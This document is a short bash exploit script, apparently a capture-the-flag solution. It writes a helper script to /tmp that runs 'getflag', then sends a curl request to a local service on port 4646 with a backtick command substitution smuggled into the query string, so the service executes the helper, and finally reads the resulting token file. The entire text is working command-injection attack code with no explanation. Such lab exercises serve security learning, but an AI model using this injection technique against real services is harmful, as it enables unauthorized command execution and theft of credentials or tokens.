#!/bin/bash
echo "#!/bin/bash" > /tmp/SCRIPT12
echo "getflag > /tmp/token12" >> /tmp/SCRIPT12
chmod +x /tmp/SCRIPT12
curl localhost:4646?x=\`/*/SCRIPT12\`
cat /tmp/token12
